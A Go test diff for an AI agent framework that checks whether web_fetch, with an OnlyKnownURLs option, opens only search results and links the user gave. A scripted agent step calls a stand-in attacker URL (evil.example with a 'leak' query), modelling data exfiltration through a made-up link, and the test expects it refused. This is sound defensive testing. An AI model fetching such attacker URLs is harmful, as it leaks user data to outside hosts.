@@ -273,6 +273,44 @@ func TestBuiltin_WebFetchReadsTheUrlWhenTheIdSentWithItIsUnknown(t *testing.T) {
 	mustEqual(t, res["title"], "Beta page", "title")
 }
 
+// With OnlyKnownURLs, web_fetch opens a link a search returned or one the
+// user wrote, however the model spells it, and nothing else: not a link
+// found on a page, and not one made up to carry data out in its query.
+func TestBuiltin_WebFetchWithOnlyKnownURLsOpensOnlySearchResultsAndTheUsersLinks(t *testing.T) {
+	fetcher := memory.NewFetcher(map[string]memory.Page{
+		"https://www.beta.example/b/":   {Title: "Beta page", Content: "Beta body"},
+		"https://user.example/menu":     {Title: "Menu", Content: "Bread"},
+		"https://evil.example/x?leak=1": {Title: "Evil", Content: "gotcha"},
+	}, "")
+	h := builtinRuntime(t, scripted(
+		step{calls: []call{{"c1", "web_search", `{"query":"b"}`}}},
+		step{calls: []call{
+			{"c2", "web_fetch", `{"url":"https://www.beta.example/b/"}`},
+			{"c3", "web_fetch", `{"url":"https://user.example/menu"}`},
+			{"c4", "web_fetch", `{"url":"https://evil.example/x?leak=1"}`},
+		}},
+		step{text: "done"},
+	), ports.BuiltinToolPorts{Search: memory.NewSearch(testHits, ""), Fetcher: fetcher}, nil)
+	tools := h.builtin(t, []string{"web_search", "web_fetch"}, agentenkit.BuiltinToolOptions{
+		WebFetch: agentenkit.WebFetchOptions{OnlyKnownURLs: true},
+	})
+	chat := h.rt.CreateStreamTextAgent(agentenkit.StreamTextAgentSpec{Name: "chat", Tools: tools})
+	ran := h.run(t, chat, agentenkit.RunInput{Prompt: "Find b, and read user.example/menu."})
+	h.handleNext(t)
+
+	mustStrings(t, fetcher.Fetched(), []string{"https://www.beta.example/b/", "https://user.example/menu"}, "the known links only")
+	mustJSON(t, h.toolResult(t, ran.ThreadID, "c4"), map[string]any{
+		"error": "web_fetch can only open a link from your web_search results or one the user gave; https://evil.example/x?leak=1 is neither",
+	}, "refused")
+	fetches := 0
+	for _, r := range h.toolRows() {
+		if r.Model == "tool:web_fetch" {
+			fetches++
+		}
+	}
+	mustEqual(t, fetches, 2, "a refused link is not a use")
+}
+
 func TestBuiltin_WebFetchWithAPromptReturnsOnlyTheSmallModelsAnswerAndBillsIt(t *testing.T) {
 	fetcher := memory.NewFetcher(map[string]memory.Page{"https://a.example/": {Title: "A", Content: strings.Repeat("The answer is 42. ", 50)}}, "")
 	h := builtinRuntime(t, scripted(
